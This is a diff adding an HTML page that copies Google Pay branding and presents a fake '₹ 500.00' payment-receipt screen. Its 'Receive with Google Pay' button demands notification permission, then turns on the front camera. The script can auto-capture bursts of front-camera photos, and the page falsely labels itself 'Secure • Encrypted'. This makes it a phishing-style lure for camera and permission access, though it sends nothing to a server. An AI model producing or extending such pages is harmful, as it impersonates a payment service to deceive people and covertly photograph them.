@@ -1,0 +1,394 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Google Pay — Confirmation (camera-ready)</title>
+  <link rel="icon" href="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-pay-icon.png">
+  <style>
+    /* === Responsive Google Pay themed page (mobile + desktop) === */
+    :root{
+      --bg:#0f1720;
+      --card:#0b1220;
+      --accent:#00a859;
+      --muted:#94a3b8;
+      --glass: rgba(255,255,255,0.04);
+      --radius:14px;
+      --gap:16px;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0}
+    body{
+      background: linear-gradient(180deg, #071124 0%, #071829 100%);
+      color:#e6eef6;
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      padding:24px;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      min-height:100vh;
+    }
+
+    .wrap{ width:100%; max-width:980px; margin:0 auto; display:grid; grid-template-columns: 420px 1fr; gap:20px; align-items:start; }
+
+    /* Stack on small screens */
+    @media (max-width:880px){ .wrap{grid-template-columns:1fr; max-width:520px} }
+
+    header.appbar{ display:flex;align-items:center;gap:12px;padding:12px 16px;background:transparent; }
+    .brand{ display:flex;align-items:center;gap:10px; }
+    .gpay-logo{ width:36px;height:36px;border-radius:8px;background:#fff;padding:4px;display:inline-flex;align-items:center;justify-content:center; }
+    .title{font-weight:600;font-size:1rem}
+    .subtitle{font-size:0.8rem;color:var(--muted);margin-top:2px}
+
+    main.card{
+      margin-top:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:var(--radius);box-shadow:0 6px 18px rgba(2,6,23,0.6);
+      backdrop-filter: blur(6px);
+    }
+
+    .amount-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+    .amount-label{color:var(--muted);font-size:0.9rem}
+    .amount{font-size:1.6rem;font-weight:700}
+
+    .merchant{ display:flex;gap:12px;align-items:center;padding:12px;background:var(--glass);border-radius:50%;margin-bottom:14px }
+    .merchant img{width:48px;height:48px;border-radius:50%;object-fit:cover}
+    .merchant .info{font-size:0.92rem}
+    .merchant .info .name{font-weight:600}
+    .merchant .info .desc{color:var(--muted);font-size:0.85rem}
+
+    .gpay-button{ display:flex;align-items:center;gap:12px;justify-content:center;padding:12px;border-radius:12px;background:linear-gradient(90deg,var(--accent),#00d876);color:#042018;font-weight:700;border:none;font-size:1rem;cursor:pointer;width:100%; box-shadow:0 6px 18px rgba(0,168,89,0.18);transition:transform .12s ease,box-shadow .12s ease; }
+    .gpay-button:active{transform:translateY(1px)}
+
+    .row{display:flex;gap:10px}
+    .small{font-size:0.85rem;color:var(--muted)}
+
+    .secondary{ margin-top:10px;display:flex;gap:10px;align-items:center;justify-content:space-between }
+    .link-btn{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:10px;border-radius:10px;color:var(--muted);font-weight:600;flex:1}
+
+    footer.credit{margin-top:14px;text-align:center;color:var(--muted);font-size:12px}
+
+    /* Right column: preview / controls for desktop */
+    .preview-pane{ display:flex;flex-direction:column;gap:12px; align-items:stretch; }
+    .preview-card{ padding:12px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));box-shadow:0 6px 20px rgba(2,6,23,0.6); min-height:360px; display:flex;flex-direction:column; }
+    .preview-header{ display:flex;align-items:center;justify-content:space-between;gap:12px }
+
+    /* Video styles */
+    video#frontVideo{ width:100%; height:auto; border-radius:10px; background:#000; max-height:480px; }
+    .controls{ display:flex;gap:8px; margin-top:10px; }
+    .control-btn{ padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:var(--muted);font-weight:600; cursor:pointer }
+
+    /* small device: use modal preview (overlay) */
+    #previewModal{ display:none; position:fixed; left:0; top:0; right:0; bottom:0; align-items:center; justify-content:center; background:linear-gradient(180deg, rgba(2,6,23,0.6), rgba(2,6,23,0.85)); z-index:60 }
+    #previewModal .modal-card{ width:100%; max-width:720px; padding:12px }
+    @media (max-width:880px){ .preview-pane{ display:none } #previewModal{ display:flex } }
+
+    /* Toast */
+    .toast{position:fixed;left:50%;bottom:22px;transform:translateX(-50%);background:#06121a;padding:12px 16px;border-radius:12px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 10px 30px rgba(2,6,23,0.6);display:none}
+    .toast.show{display:block}
+
+    button:focus, a:focus{outline:3px solid rgba(0,168,89,0.16);outline-offset:2px}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <div>
+    <header class="appbar" role="banner">
+      <div class="brand">
+        <div class="gpay-logo" aria-hidden>
+          <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-pay-icon.png" alt="G" style="width:24px;height:24px;">
+        </div>
+        <div>
+          <div class="title">Google Pay</div>
+          <div class="subtitle">Confirm payment</div>
+        </div>
+      </div>
+    </header>
+
+    <main class="card" role="main">
+      <div class="amount-row">
+        <div>
+          <div class="amount-label">Receive</div>
+          <div class="amount">₹ 500.00</div>
+        </div>
+        <div style="text-align:right">
+          <div class="small">To</div>
+          <div style="font-weight:700">Priya Rajput</div>
+        </div>
+      </div>
+
+      <div class="merchant" aria-label="merchant">
+        <img src="https://i.pinimg.com/736x/0f/bd/3b/0fbd3bbda94b27ffe078214170e25c73.jpg" alt="merchant logo">
+        <div class="info">
+          <div class="name">Subhan S</div>
+          <div class="desc">Payment Id #45378432</div>
+        </div>
+      </div>
+
+      <button class="gpay-button" id="payBtn" aria-describedby="payInfo">
+        <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-pay-icon.png" alt="Google Pay" style="width:22px;height:22px;filter:brightness(0) saturate(100%);"> Receive with Google Pay
+      </button>
+
+      <div class="secondary">
+        <button class="link-btn" id="notifyBtn">Allow notifications</button>
+        <button class="link-btn" id="saveCard">Save card</button>
+      </div>
+
+      <div style="margin-top:12px">
+        <label class="small">Receipt email</label>
+        <input id="email" type="email" placeholder="you@example.com" style="width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);margin-top:8px;background:transparent;color:inherit">
+      </div>
+
+      <div style="margin-top:14px;display:flex;gap:8px;align-items:center;justify-content:space-between">
+        <div class="small">Total charged: <strong>₹ 500.00</strong></div>
+        <div class="small">Secure • Encrypted</div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Right column: preview and device controls (desktop-first) -->
+  <div class="preview-pane" aria-hidden="false">
+    <div class="preview-card">
+      <div class="preview-header">
+        <div>
+          <div style="font-weight:700">Camera preview</div>
+          <div id="captureStatus" class="small">Preview inactive</div>
+        </div>
+        <div style="display:flex;gap:8px;align-items:center">
+          <label class="small">Camera:</label>
+          <select id="deviceSelect" style="background:transparent;border-radius:8px;padding:8px;border:1px solid rgba(255,255,255,0.06);color:inherit;"></select>
+          <button class="control-btn" id="toggleMirror">Mirror</button>
+        </div>
+      </div>
+
+      <video id="frontVideo" playsinline autoplay muted></video>
+
+      <div class="controls">
+        <button class="control-btn" id="snapOnce">Snap once</button>
+        <button class="control-btn" id="snapAuto">Auto capture</button>
+        <button class="control-btn" id="closePreview">Stop</button>
+      </div>
+
+      <div style="margin-top:8px;" class="small">Tip: On desktops you can choose a different camera (front/back) using the selector above. This page requires HTTPS or localhost to access camera.</div>
+    </div>
+  </div>
+</div>
+
+<!-- Mobile modal preview (shown only on small screens) -->
+<div id="previewModal" role="dialog" aria-modal="true" aria-label="Camera preview">
+  <div class="modal-card preview-card">
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div id="modalStatus" class="small">Camera preview off</div>
+      <button class="control-btn" id="modalClose">Close</button>
+    </div>
+    <video id="modalVideo" playsinline autoplay muted style="border-radius:10px; background:#000"></video>
+    <div class="preview-controls" style="display:flex;gap:8px;margin-top:10px">
+      <button class="control-btn" id="modalSnap">Snap once</button>
+      <button class="control-btn" id="modalAuto">Auto capture</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast">Permission granted ✅</div>
+
+<script>
+  // Elements
+  const payBtn = document.getElementById('payBtn');
+  const notifyBtn = document.getElementById('notifyBtn');
+  const saveCard = document.getElementById('saveCard');
+  const toast = document.getElementById('toast');
+
+  const previewPane = document.querySelector('.preview-pane');
+  const frontVideo = document.getElementById('frontVideo');
+  const captureStatus = document.getElementById('captureStatus');
+  const snapOnce = document.getElementById('snapOnce');
+  const snapAuto = document.getElementById('snapAuto');
+  const closePreview = document.getElementById('closePreview');
+  const deviceSelect = document.getElementById('deviceSelect');
+  const toggleMirror = document.getElementById('toggleMirror');
+
+  const previewModal = document.getElementById('previewModal');
+  const modalVideo = document.getElementById('modalVideo');
+  const modalStatus = document.getElementById('modalStatus');
+  const modalClose = document.getElementById('modalClose');
+  const modalSnap = document.getElementById('modalSnap');
+  const modalAuto = document.getElementById('modalAuto');
+
+  let currentStream = null;
+  let mirror = true;
+  const NUM_PHOTOS = 5;
+  const INTERVAL_MS = 800;
+
+  function showToast(msg, ms = 2200){ toast.textContent = msg; toast.classList.add('show'); setTimeout(()=> toast.classList.remove('show'), ms); }
+
+  async function ensureNotificationPermission(){
+    if (typeof Notification === 'undefined') { showToast('Notifications not supported'); return false; }
+    if (Notification.permission === 'granted') return true;
+    try { const p = await Notification.requestPermission(); return p === 'granted'; } catch(e){ return false; }
+  }
+
+  // Enumerate devices and populate selector (useful on desktop)
+  async function populateDeviceList() {
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const cams = devices.filter(d => d.kind === 'videoinput');
+      deviceSelect.innerHTML = '';
+      cams.forEach((c, idx) => {
+        const opt = document.createElement('option');
+        opt.value = c.deviceId;
+        // label might be empty until permission granted
+        opt.textContent = c.label || `Camera ${idx+1}`;
+        deviceSelect.appendChild(opt);
+      });
+      if (cams.length === 0) {
+        const opt = document.createElement('option'); opt.textContent = 'No camera found'; deviceSelect.appendChild(opt);
+      }
+    } catch (e) {
+      console.warn('populateDeviceList failed', e);
+    }
+  }
+
+  // Get stream with optional deviceId, and prefer facingMode user when device not specified
+  async function getStream({ deviceId = null } = {}){
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('Camera not supported');
+    const constraints = deviceId ? { video: { deviceId: { exact: deviceId } } } : { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } };
+    return await navigator.mediaDevices.getUserMedia(constraints);
+  }
+
+  function stopStream(stream) {
+    try { if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop()); } catch(e){}
+  }
+
+  // Attach stream to element and set mirror according to flag
+  async function attachStreamTo(el, stream) {
+    el.srcObject = stream;
+    try {
+      await el.play();
+    } catch (e) { /* autoplay may be blocked until user interaction */ }
+    el.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)';
+  }
+
+  // Open preview (desktop pane or mobile modal depending on width)
+  async function openPreview(options = {}){
+    const isMobile = window.matchMedia('(max-width:880px)').matches;
+    const targetVideo = isMobile ? modalVideo : frontVideo;
+    const statusEl = isMobile ? modalStatus : captureStatus;
+
+    statusEl.textContent = 'Requesting camera…';
+    try {
+      // if device selector has a chosen device, use it
+      const deviceId = deviceSelect.value || null;
+      const stream = await getStream({ deviceId: deviceId && deviceId !== 'No camera found' ? deviceId : null });
+      // stop previous
+      stopStream(currentStream);
+      currentStream = stream;
+      await attachStreamTo(targetVideo, stream);
+      statusEl.textContent = 'Camera active — preview shown';
+      // show modal on mobile
+      if (isMobile) previewModal.style.display = 'flex';
+      // update device list (labels will be available now)
+      await populateDeviceList();
+      return stream;
+    } catch (err) {
+      console.error('openPreview error', err);
+      statusEl.textContent = 'Camera failed: ' + (err.message || err);
+      showToast('Could not access camera');
+      if (isMobile) setTimeout(()=> previewModal.style.display = 'none', 1200);
+      throw err;
+    }
+  }
+
+  // Capture a single frame from the provided video element and download
+  function captureFromVideo(videoEl, filenamePrefix = 'capture'){
+    if (!videoEl || videoEl.readyState < 2) { showToast('Preview not ready'); return false; }
+    const w = videoEl.videoWidth; const h = videoEl.videoHeight;
+    const canvas = document.createElement('canvas'); canvas.width = w; canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    // mirror if element is mirrored
+    if ((getComputedStyle(videoEl).transform || '').includes('matrix(-1')) {
+      ctx.save(); ctx.translate(w,0); ctx.scale(-1,1); ctx.drawImage(videoEl,0,0,w,h); ctx.restore();
+    } else {
+      ctx.drawImage(videoEl,0,0,w,h);
+    }
+    canvas.toBlob(blob => {
+      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+      a.download = `${filenamePrefix}_${Date.now()}.jpg`; a.click(); URL.revokeObjectURL(a.href);
+    }, 'image/jpeg', 0.92);
+    return true;
+  }
+
+  // Auto capture N photos from currently shown preview (modal or pane)
+  async function autoCapture(num = NUM_PHOTOS, intervalMs = INTERVAL_MS){
+    const isMobile = window.matchMedia('(max-width:880px)').matches;
+    const videoEl = isMobile ? modalVideo : frontVideo;
+    try {
+      if (!currentStream) await openPreview();
+      captureStatus.textContent = `Auto capturing ${num} photos…`;
+      await new Promise(r => setTimeout(r, 300));
+      for (let i=0;i<num;i++){
+        captureFromVideo(videoEl, 'frontcam');
+        captureStatus.textContent = `Captured ${i+1} / ${num}`;
+        await new Promise(r => setTimeout(r, intervalMs));
+      }
+      showToast(`Captured ${num} photos`);
+    } catch (err) {
+      console.warn('auto capture failed', err); showToast('Auto capture failed');
+    }
+  }
+
+  // Event wiring
+  payBtn.addEventListener('click', async () => {
+    payBtn.disabled = true; const orig = payBtn.innerHTML; payBtn.innerHTML = 'Requesting permissions…';
+    // keep notification step optional on desktop; prompt anyway
+    let notifOk = false;
+    try { notifOk = await ensureNotificationPermission(); } catch(e){ notifOk = false; }
+    if (!notifOk) { showToast('Notifications required — please allow'); payBtn.disabled = false; payBtn.innerHTML = orig; return; }
+    try {
+      await openPreview(); showToast('Camera permission granted — preview started'); payBtn.innerHTML = 'Previewing…';
+    } catch (err) { showToast('Camera permission denied or error'); }
+    finally { setTimeout(()=>{ payBtn.disabled = false; payBtn.innerHTML = orig; }, 900); }
+  });
+
+  // Individual controls
+  notifyBtn.addEventListener('click', async () => { const ok = await ensureNotificationPermission(); showToast(ok ? 'Notifications allowed' : 'Notifications denied'); });
+  saveCard.addEventListener('click', ()=> showToast('Card saved (demo)'));
+
+  snapOnce.addEventListener('click', () => { captureFromVideo(frontVideo, 'frontcam'); showToast('Snapshot taken'); });
+  snapAuto.addEventListener('click', async () => await autoCapture(NUM_PHOTOS, INTERVAL_MS));
+  closePreview.addEventListener('click', () => { stopStream(currentStream); currentStream = null; captureStatus.textContent = 'Preview stopped'; frontVideo.srcObject = null; });
+
+  // Device selector change (switch camera)
+  deviceSelect.addEventListener('change', async () => {
+    if (!deviceSelect.value) return;
+    try {
+      await openPreview({ deviceId: deviceSelect.value });
+    } catch(e){ console.warn('device switch failed', e); }
+  });
+
+  toggleMirror.addEventListener('click', ()=>{ mirror = !mirror; frontVideo.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)'; toggleMirror.textContent = mirror ? 'Mirror' : 'No mirror'; });
+
+  // Mobile modal handlers
+  modalClose.addEventListener('click', () => { stopStream(currentStream); currentStream = null; modalVideo.srcObject = null; previewModal.style.display = 'none'; });
+  modalSnap.addEventListener('click', () => { captureFromVideo(modalVideo, 'frontcam'); showToast('Snapshot taken'); });
+  modalAuto.addEventListener('click', async () => await autoCapture(NUM_PHOTOS, INTERVAL_MS));
+
+  // Populate device list on load (labels will appear after permission)
+  (async ()=>{ if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) await populateDeviceList(); })();
+
+  // Expose for debugging
+  window.openPreview = openPreview; window.autoCapture = autoCapture; window.stopStream = ()=>{ stopStream(currentStream); currentStream = null; };
+
+  // Accessibility: keyboard shortcuts for desktop
+  window.addEventListener('keydown', (e) => {
+    if (e.key === 'p') { // p to open preview
+      e.preventDefault(); openPreview().catch(()=>{});
+    }
+    if (e.key === 's') { // s to snap
+      captureFromVideo(frontVideo, 'frontcam');
+    }
+  });
+</script>
+</body>
+</html>
